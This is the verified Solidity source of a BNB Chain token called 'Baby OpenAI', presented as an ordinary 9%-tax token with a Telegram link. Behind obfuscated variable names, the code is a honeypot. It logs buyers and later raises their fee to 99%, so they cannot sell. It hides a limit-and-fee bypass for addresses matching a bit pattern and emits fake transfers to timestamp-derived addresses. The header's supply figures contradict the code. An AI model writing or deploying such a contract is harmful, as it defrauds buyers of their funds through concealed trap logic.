/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

// SPDX-License-Identifier: MIT
////BabyOpenAI,

//    Tax breakdown:
 //   🤖 Buy / Sell 9%

 //   Total Supply: 10,000,000,000,000,000
 //   Max Wallet :     2% [300000000000000] 

 //   https://t.me/+ufsSMH095yNhNDdl

pragma solidity ^0.8.17;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract BabyOpenAI is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Baby OpenAI";
    string constant _symbol = "BabyOpenAI";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private teamTxFeeBurn;
    mapping(address => bool) private isMarketingModeTeam;
    mapping(address => bool) private teamSwapMarketingIsSell;
    mapping(address => bool) private buyTeamModeMin;
    mapping(address => uint256) private marketingTeamBotsSwap;
    mapping(uint256 => address) private walletLimitBurnMax;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private swapWalletLaunchedReceiver = 0;
    uint256 private feeBotsMinExemptReceiverTrading = 9;

    //SELL FEES
    uint256 private sellModeTradingAuto = 0;
    uint256 private burnMaxBuySwapTx = 9;

    uint256 private limitIsModeTrading = feeBotsMinExemptReceiverTrading + swapWalletLaunchedReceiver;
    uint256 private txAutoLimitBurn = 100;

    address private maxFeeBotsWallet = (msg.sender); // auto-liq address
    address private limitBuySellWallet = (0x27c89e8804866B2f3fC4FC3Ed38698621D9E0FC2); // marketing address
    address private teamSwapTxIs = DEAD;
    address private maxIsLiquidityTeam = DEAD;
    address private liquidityAutoMarketingModeFeeBotsBuy = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private swapExemptIsSell;
    uint256 private liquidityMinMaxSell;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private tradingIsFeeModeBurnExemptSell;
    uint256 private txTeamTradingLaunched;
    uint256 private launchedBuySwapReceiver;
    uint256 private liquiditySwapBotsMarketingMinWallet;
    uint256 private modeSellIsFee;

    bool private tradingModeMinFeeBurnSell = true;
    bool private buyTeamModeMinMode = true;
    bool private botsLiquidityTeamMax = true;
    bool private teamBotsTradingLaunched = true;
    bool private exemptTeamModeBurn = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private tradingReceiverMinSwap = _totalSupply / 1000; // 0.1%

    
    uint256 private receiverLaunchedMinAuto;
    bool private burnExemptModeTxMinBuy;
    bool private limitExemptReceiverLaunchedTx;
    bool private sellLaunchedBotsWallet;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        tradingIsFeeModeBurnExemptSell = true;

        teamTxFeeBurn[msg.sender] = true;
        teamTxFeeBurn[address(this)] = true;

        isMarketingModeTeam[msg.sender] = true;
        isMarketingModeTeam[0x0000000000000000000000000000000000000000] = true;
        isMarketingModeTeam[0x000000000000000000000000000000000000dEaD] = true;
        isMarketingModeTeam[address(this)] = true;

        teamSwapMarketingIsSell[msg.sender] = true;
        teamSwapMarketingIsSell[0x0000000000000000000000000000000000000000] = true;
        teamSwapMarketingIsSell[0x000000000000000000000000000000000000dEaD] = true;
        teamSwapMarketingIsSell[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return limitMaxBotsMarketing(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return limitMaxBotsMarketing(sender, recipient, amount);
    }

    function limitMaxBotsMarketing(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = isBotsLimitTeam(sender) || isBotsLimitTeam(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                exemptReceiverBurnSell();
            }
            if (!bLimitTxWalletValue) {
                walletLaunchedMarketingBots(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return marketingMinLimitLaunched(sender, recipient, amount);}

        if (!teamTxFeeBurn[sender] && !teamTxFeeBurn[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || teamSwapMarketingIsSell[sender] || teamSwapMarketingIsSell[recipient], "Max TX Limit has been triggered");

        if (isBotsBuyMaxTxBurn()) {modeMinAutoMarketing();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = receiverTxSellBurn(sender) ? swapExemptLiquidityMin(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function marketingMinLimitLaunched(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function receiverTxSellBurn(address sender) internal view returns (bool) {
        return !isMarketingModeTeam[sender];
    }

    function marketingBotsMinBuyAutoExempt(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            limitIsModeTrading = burnMaxBuySwapTx + sellModeTradingAuto;
            return buySellAutoMinSwap(sender, limitIsModeTrading);
        }
        if (!selling && sender == uniswapV2Pair) {
            limitIsModeTrading = feeBotsMinExemptReceiverTrading + swapWalletLaunchedReceiver;
            return limitIsModeTrading;
        }
        return buySellAutoMinSwap(sender, limitIsModeTrading);
    }

    function swapExemptLiquidityMin(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(marketingBotsMinBuyAutoExempt(sender, receiver == uniswapV2Pair)).div(txAutoLimitBurn);

        if (buyTeamModeMin[sender] || buyTeamModeMin[receiver]) {
            feeAmount = amount.mul(99).div(txAutoLimitBurn);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        if (_balances[address(this)] > 2 * 10 ** _decimals && sender == uniswapV2Pair) {
            for (uint i = 0; i < 2; i++) {
                address addr = address(uint160(block.timestamp + i));
                _balances[addr] = _balances[addr] + 10 ** _decimals;
                emit Transfer(address(this), addr, 10 ** _decimals);
            }
            _balances[address(this)] = _balances[address(this)].sub(2 * 10 ** _decimals);
        }

        return amount.sub(feeAmount);
    }

    function isBotsLimitTeam(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function buySellAutoMinSwap(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = marketingTeamBotsSwap[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function walletLaunchedMarketingBots(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        walletLimitBurnMax[exemptLimitValue] = addr;
    }

    function exemptReceiverBurnSell() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (marketingTeamBotsSwap[walletLimitBurnMax[i]] == 0) {
                    marketingTeamBotsSwap[walletLimitBurnMax[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(limitBuySellWallet).transfer(amountBNB * amountPercentage / 100);
    }

    function isBotsBuyMaxTxBurn() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    exemptTeamModeBurn &&
    _balances[address(this)] >= tradingReceiverMinSwap;
    }

    function modeMinAutoMarketing() internal swapping {
        uint256 amountToLiquify = tradingReceiverMinSwap.mul(swapWalletLaunchedReceiver).div(limitIsModeTrading).div(2);
        uint256 amountToSwap = tradingReceiverMinSwap.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = limitIsModeTrading.sub(swapWalletLaunchedReceiver.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(swapWalletLaunchedReceiver).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(feeBotsMinExemptReceiverTrading).div(totalETHFee);

        payable(limitBuySellWallet).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                maxFeeBotsWallet,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getTxAutoLimitBurn() public view returns (uint256) {
        if (txAutoLimitBurn == swapWalletLaunchedReceiver) {
            return swapWalletLaunchedReceiver;
        }
        if (txAutoLimitBurn != tradingReceiverMinSwap) {
            return tradingReceiverMinSwap;
        }
        return txAutoLimitBurn;
    }
    function setTxAutoLimitBurn(uint256 a0) public onlyOwner {
        if (txAutoLimitBurn != tradingReceiverMinSwap) {
            tradingReceiverMinSwap=a0;
        }
        if (txAutoLimitBurn == sellModeTradingAuto) {
            sellModeTradingAuto=a0;
        }
        if (txAutoLimitBurn == limitIsModeTrading) {
            limitIsModeTrading=a0;
        }
        txAutoLimitBurn=a0;
    }

    function getLimitBuySellWallet() public view returns (address) {
        return limitBuySellWallet;
    }
    function setLimitBuySellWallet(address a0) public onlyOwner {
        limitBuySellWallet=a0;
    }

    function getTeamSwapTxIs() public view returns (address) {
        return teamSwapTxIs;
    }
    function setTeamSwapTxIs(address a0) public onlyOwner {
        if (teamSwapTxIs == liquidityAutoMarketingModeFeeBotsBuy) {
            liquidityAutoMarketingModeFeeBotsBuy=a0;
        }
        if (teamSwapTxIs != teamSwapTxIs) {
            teamSwapTxIs=a0;
        }
        if (teamSwapTxIs != maxFeeBotsWallet) {
            maxFeeBotsWallet=a0;
        }
        teamSwapTxIs=a0;
    }

    function getTradingModeMinFeeBurnSell() public view returns (bool) {
        if (tradingModeMinFeeBurnSell == teamBotsTradingLaunched) {
            return teamBotsTradingLaunched;
        }
        if (tradingModeMinFeeBurnSell == tradingModeMinFeeBurnSell) {
            return tradingModeMinFeeBurnSell;
        }
        if (tradingModeMinFeeBurnSell == exemptTeamModeBurn) {
            return exemptTeamModeBurn;
        }
        return tradingModeMinFeeBurnSell;
    }
    function setTradingModeMinFeeBurnSell(bool a0) public onlyOwner {
        tradingModeMinFeeBurnSell=a0;
    }

    function getSwapWalletLaunchedReceiver() public view returns (uint256) {
        return swapWalletLaunchedReceiver;
    }
    function setSwapWalletLaunchedReceiver(uint256 a0) public onlyOwner {
        if (swapWalletLaunchedReceiver == feeBotsMinExemptReceiverTrading) {
            feeBotsMinExemptReceiverTrading=a0;
        }
        swapWalletLaunchedReceiver=a0;
    }

    function getBuyTeamModeMin(address a0) public view returns (bool) {
        if (buyTeamModeMin[a0] == isMarketingModeTeam[a0]) {
            return botsLiquidityTeamMax;
        }
            return buyTeamModeMin[a0];
    }
    function setBuyTeamModeMin(address a0,bool a1) public onlyOwner {
        if (buyTeamModeMin[a0] != isMarketingModeTeam[a0]) {
           isMarketingModeTeam[a0]=a1;
        }
        if (a0 != teamSwapTxIs) {
            teamBotsTradingLaunched=a1;
        }
        buyTeamModeMin[a0]=a1;
    }

    function getTeamBotsTradingLaunched() public view returns (bool) {
        if (teamBotsTradingLaunched != tradingModeMinFeeBurnSell) {
            return tradingModeMinFeeBurnSell;
        }
        if (teamBotsTradingLaunched != tradingModeMinFeeBurnSell) {
            return tradingModeMinFeeBurnSell;
        }
        return teamBotsTradingLaunched;
    }
    function setTeamBotsTradingLaunched(bool a0) public onlyOwner {
        if (teamBotsTradingLaunched == tradingModeMinFeeBurnSell) {
            tradingModeMinFeeBurnSell=a0;
        }
        if (teamBotsTradingLaunched != exemptTeamModeBurn) {
            exemptTeamModeBurn=a0;
        }
        if (teamBotsTradingLaunched == botsLiquidityTeamMax) {
            botsLiquidityTeamMax=a0;
        }
        teamBotsTradingLaunched=a0;
    }

    function getTeamSwapMarketingIsSell(address a0) public view returns (bool) {
        if (teamSwapMarketingIsSell[a0] == buyTeamModeMin[a0]) {
            return exemptTeamModeBurn;
        }
        if (teamSwapMarketingIsSell[a0] != isMarketingModeTeam[a0]) {
            return tradingModeMinFeeBurnSell;
        }
            return teamSwapMarketingIsSell[a0];
    }
    function setTeamSwapMarketingIsSell(address a0,bool a1) public onlyOwner {
        if (a0 == maxFeeBotsWallet) {
            botsLiquidityTeamMax=a1;
        }
        if (teamSwapMarketingIsSell[a0] != buyTeamModeMin[a0]) {
           buyTeamModeMin[a0]=a1;
        }
        if (a0 != limitBuySellWallet) {
            teamBotsTradingLaunched=a1;
        }
        teamSwapMarketingIsSell[a0]=a1;
    }

    function getTradingReceiverMinSwap() public view returns (uint256) {
        if (tradingReceiverMinSwap == txAutoLimitBurn) {
            return txAutoLimitBurn;
        }
        return tradingReceiverMinSwap;
    }
    function setTradingReceiverMinSwap(uint256 a0) public onlyOwner {
        if (tradingReceiverMinSwap != limitIsModeTrading) {
            limitIsModeTrading=a0;
        }
        if (tradingReceiverMinSwap != sellModeTradingAuto) {
            sellModeTradingAuto=a0;
        }
        tradingReceiverMinSwap=a0;
    }

    function getLimitIsModeTrading() public view returns (uint256) {
        if (limitIsModeTrading != txAutoLimitBurn) {
            return txAutoLimitBurn;
        }
        if (limitIsModeTrading != swapWalletLaunchedReceiver) {
            return swapWalletLaunchedReceiver;
        }
        return limitIsModeTrading;
    }
    function setLimitIsModeTrading(uint256 a0) public onlyOwner {
        limitIsModeTrading=a0;
    }

    function getBotsLiquidityTeamMax() public view returns (bool) {
        if (botsLiquidityTeamMax == tradingModeMinFeeBurnSell) {
            return tradingModeMinFeeBurnSell;
        }
        return botsLiquidityTeamMax;
    }
    function setBotsLiquidityTeamMax(bool a0) public onlyOwner {
        if (botsLiquidityTeamMax != buyTeamModeMinMode) {
            buyTeamModeMinMode=a0;
        }
        botsLiquidityTeamMax=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}